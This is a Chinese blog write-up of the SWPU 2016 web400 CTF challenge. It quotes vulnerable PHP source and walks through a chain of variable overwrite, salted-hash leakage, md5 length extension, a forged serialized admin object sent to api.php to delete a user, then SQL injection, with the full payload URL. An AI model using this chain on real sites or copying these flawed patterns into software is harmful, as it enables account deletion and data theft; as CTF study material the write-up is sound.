<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/135097078">urllib2 HTTP头部注入</a></p>
<h1>[SWPU 2016]web400</h1>
<p>这道题我是在找不到源码泄露的地方。。。只能看wp，cp一下了</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//common.php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">"_POST"</span>,<span class="hljs-string">"_GET"</span>,<span class="hljs-string">"_COOKIE"</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>){<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$key</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>){<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$v</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"hello,hacker!"</span>);<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>] !=<span class="hljs-string">'_'</span>?<span class="hljs-variable">$$k</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$v</span>):<span class="hljs-variable">$$k</span> = <span class="hljs-string">""</span>;<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>这里看到$$配合foreach可以想到变量覆盖，这里test一下看看覆盖逻辑</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">"_POST"</span>,<span class="hljs-string">"_GET"</span>,<span class="hljs-string">"_COOKIE"</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>){<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$key</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>){<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$v</span>)){<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"hello,hacker!"</span>);<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>].<span class="hljs-string">"\n"</span>;<br>            <span class="hljs-variable">$k</span>[<span class="hljs-number">0</span>] !=<span class="hljs-string">'_'</span>?<span class="hljs-variable">$$k</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$v</span>):<span class="hljs-variable">$$k</span> = <span class="hljs-string">""</span>;<br>        }<br>    }<br>}<br><br><span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></tbody></table></figure>
<p>当我们输入以上代码的时候，我们get传参一下，如下图</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315114631730.png" alt="image-20240315114631730"></p>
<p>可以看到已经初始化的a变量没有被覆盖，而b未初始化，但被覆盖（但光靠想我想不出来为何a没有被覆盖）</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//riji.php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">"common.php"</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>] !== <span class="hljs-number">1</span>)  <span class="hljs-comment">//检测登陆，没登陆就没有然后了</span><br>{<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/web/index.php'</span>);<br>    <span class="hljs-keyword">exit</span>();<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>])<br>{<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>];<br>    @<span class="hljs-title function_ invoke__">mysql_conn</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;<br>    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));  <span class="hljs-comment">//查询用户</span><br>    <span class="hljs-title function_ invoke__">mysql_close</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>])  <span class="hljs-comment">//用户不存在就不会执行下面的语句，id就不会初始化了</span><br>    {<br>        <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>]);<br>    }<br>}<br><span class="hljs-keyword">else</span><br>{<br>    <span class="hljs-keyword">exit</span>();<br>}<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//中间省略部分html代码，下面是id关键代码</span><br><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">mysql_conn</span>();<br><span class="hljs-variable">$sql1</span> = <span class="hljs-string">"select * from msg where userid= <span class="hljs-subst">$id</span> order by id"</span>;  <span class="hljs-comment">//id参数没有过滤</span><br><span class="hljs-variable">$query</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql1</span>);                                <span class="hljs-comment">//直接sql注入</span><br><span class="hljs-variable">$result1</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">mysql_fetch_assoc</span>(<span class="hljs-variable">$query</span>)) {<br>    <span class="hljs-variable">$result1</span>[]=<span class="hljs-variable">$temp</span>;<br>}<br><span class="hljs-title function_ invoke__">mysql_close</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$o</span>)<br>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$o</span>[<span class="hljs-string">'msg'</span>]);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>上述代码会获取当前登录的用户名，然后进入数据库查询该用户的userid，并将其转换为整数</p>
<p>接着将得到的userid传入数据库在进行查询（但这个userid没有被过滤），获取到相应的结果。很明显这里的userid是不可控的，因为userid本身就在数据库中（已经被初始化），我们继续看代码，看是否能搞一些东西来控制他</p>
<p>在 api.php 中有 del_user 函数，可以删除用户，但是需要 userid 的值</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//api.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del_user</span>(<span class="hljs-params"></span>)</span>{<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;userid){  <span class="hljs-comment">//需要userid信息才行</span><br>        <span class="hljs-variable">$user_id</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;userid);<span class="hljs-comment">//防注入</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user_id</span> == <span class="hljs-number">1</span>){<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Admin can\'t delete!!")&lt;/script&gt;'</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        }<br>        @<span class="hljs-title function_ invoke__">mysql_conn</span>();<br>        <span class="hljs-variable">$sql2</span> = <span class="hljs-string">"DELETE FROM user where userid='<span class="hljs-subst">$user_id</span>'"</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql2</span>)){<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Delete user success!!")&lt;/script&gt;'</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Delete user wrong!!")&lt;/script&gt;'</span>);<br>            <span class="hljs-keyword">exit</span>();<br>        }<br><br>        <span class="hljs-title function_ invoke__">mysql_close</span>();<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'&lt;script&gt;alert("Check Your user_id!!")&lt;/script&gt;'</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>可以看到这里的del_user是一个删除用户的功能函数，先判断userid是否存在，然后转为整数，如果等于1，显示不能删除admin用户，如果不是1的话，我们就可以实现除admin之外任意用户的删除了</p>
<p>在 index.php 中可以找到 cookie 的拼接方法，cookie 里面就有 userid，base64 解一下就可以了</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$login</span>==<span class="hljs-number">1</span>)<br>{<br><br>    @<span class="hljs-title function_ invoke__">mysql_conn</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;<br>    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));<br>    <span class="hljs-title function_ invoke__">mysql_close</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))<br>    {<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'passwd'</span>] == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))<br>        {<br>            <span class="hljs-variable">$user_cookie</span> = <span class="hljs-string">''</span>;<br>            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'userid'</span>];  <span class="hljs-comment">//user_cookie拼接方法，userid+name+salt</span><br>            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'name'</span>];<br>            <span class="hljs-variable">$user_cookie</span> .= <span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>];<br>            <span class="hljs-variable">$cookies</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$user_cookie</span>);  <span class="hljs-comment">//拼接后base64编码就是cookie了</span><br>            <span class="hljs-comment">//$cookies = $user_cookie;</span><br>            <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">"user"</span>,<span class="hljs-variable">$cookies</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">60</span>,<span class="hljs-string">'/web/'</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'login'</span>] = <span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'user'</span>] = <span class="hljs-variable">$username</span>;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/web/riji.php'</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Password Worng?')&lt;/script&gt;"</span>);<br>        }<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Username Worng?')&lt;/script&gt;"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>作者是登录页面的处理，如果用户名存在，且对应的密码也相等了，就能登录。但这里暴漏了cookie的拼接方法，就是纯明文拼接，接着base64加密。</p>
<p>下面我们就要利用api.php提供的接口函数，因为这个文件被当做公共库被包含，在api.php的最下面找到：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-variable">$a</span> = <span class="hljs-built_in">unserialize</span>(base64_decode($api));<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-built_in">do_method</span>();<br></code></pre></td></tr></tbody></table></figure>
<p>其中$api没有被初始化，所以这里我们就可以利用这个参数来控制admin这个类</p>
<p>del_user 函数使用前会调用 check 函数检测是否是 admin 用户，但是 check 函数存在 hash 拓展攻击，那么我们可以伪造一个 hash 实现 bypass</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//api.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>{<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$this</span>-&gt;name);  <span class="hljs-comment">//进入数据库的数据进行转义</span><br>    @<span class="hljs-title function_ invoke__">mysql_conn</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;<br>    <span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));<br>    <span class="hljs-title function_ invoke__">mysql_close</span>();<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)){<br>        <span class="hljs-comment">//利用 salt 验证是否为该用户</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>] . <span class="hljs-variable">$this</span>-&gt;data . <span class="hljs-variable">$username</span>)){  <span class="hljs-comment">//这里存在hash拓展攻击</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'(=-=)!!'</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'role'</span>] == <span class="hljs-number">1</span>){<span class="hljs-comment">//检查是否为admin用户</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            }<br>            <span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            }<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>在 forget.php 中可以无条件获取任意用户加盐后的 hash，从而有了 hash 拓展攻击的原材料</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//forget.php</span><br>@<span class="hljs-title function_ invoke__">mysql_conn</span>();<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from user where name='<span class="hljs-subst">$username</span>'"</span>;<br><span class="hljs-variable">$result</span> = @<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>));<br><span class="hljs-title function_ invoke__">mysql_close</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))<br>{<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>])<br>    {<br>        <span class="hljs-variable">$check</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$result</span>[<span class="hljs-string">'salt'</span>]));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">'name'</span>];<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location:/web/repass.php?username=<span class="hljs-subst">$name</span>&amp;check=<span class="hljs-subst">$check</span>&amp;mibao=<span class="hljs-subst">$mibao</span>&amp;pass=<span class="hljs-subst">$pass</span>"</span>);<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"&lt;script&gt;alert('Get salt Worng?')&lt;/script&gt;"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>首先在forget.php页面，输入用户admin，其他随便输入，接着发送，bp抓取302跳转，会发现它显示出了salt的md5加密结果。如下所示</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315120703273.png" alt="image-20240315120703273"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">/repass<span class="hljs-selector-class">.php</span>?username=admin&amp;check=YWI0ZDIyOTI1ZDI2OGRkNjkzN2U0MWVkYmU4MWU5N2U=&amp;mibao=asd&amp;pass=asd<br><span class="hljs-comment">//解密:ab4d22925d268dd6937e41edbe81e97e</span><br></code></pre></td></tr></tbody></table></figure>
<p>利用hash拓展工具破解</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121059169.png" alt="image-20240315121059169"></p>
<p>得到新hash:</p>
<p>拿到payload和生成好的md5，然后根据check的流程构造一个调用那个删除用户的接口函数，下面是构造删除当前用户的的代码：</p>
<p>对了，这里面要确定要删除用户的userid是哪一个，在用户登陆的跳转的地方用burp停一下，返回的数据里面的cookie里面有当前用户的userid(base64加密之后的数据）</p>
<p>得到这些之后构造代码：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;?php<br>class admin {<br>    <span class="hljs-selector-tag">var</span> <span class="hljs-variable">$name</span>="admin";<br>	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$check</span>="<span class="hljs-number">6122</span>c04e8a1f3529d556199960ef2556";   <span class="hljs-comment">//要check的md5</span><br>	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$data</span>="\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00";  <span class="hljs-comment">//工具生成好的可控变量(payload)</span><br>        <br>                 <br>	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$method</span>="del_user";   <span class="hljs-comment">//要调用的函数</span><br>	<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$userid</span>="<span class="hljs-number">2</span>";  <span class="hljs-comment">//要删除的用户</span><br>	<br>       <br>}<br> <br><span class="hljs-variable">$a</span>=new <span class="hljs-built_in">admin</span>();<br><span class="hljs-variable">$api</span>=<span class="hljs-built_in">base64_encode</span>(serialize($a));<br>echo <span class="hljs-variable">$api</span>;<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9<br></code></pre></td></tr></tbody></table></figure>
<p>接着发送如下payload即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://node4.anna.nssctf.cn:<span class="hljs-number">28418</span>/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiI2MTIyYzA0ZThhMWYzNTI5ZDU1NjE5OTk2MGVmMjU1NiI7czo0OiJkYXRhIjtzOjQ4OiKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9<br></code></pre></td></tr></tbody></table></figure>
<p>如下图所示删除成功，id也成为了未初始化变量，我们直接对id进行联合注入即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121539479.png" alt="image-20240315121539479"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121618906.png" alt="image-20240315121618906"></p>
<h2 id="参考文章-4">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://blog.xlab.app/p/16de60a6/">SWPU 2017 write-up</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/niexinming/article/details/52976923">详解2016 SWPU CTF web4</a></p>
<h1>[GFCTF 2021]A Letter</h1>
<p>这道题怀疑环境有问题。。。毕竟两年之久</p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/03/03/swpuctf/">http://hybcx.xyz/2024/03/03/swpuctf/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                                    <span class="chip bg-color">CTF赛事</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
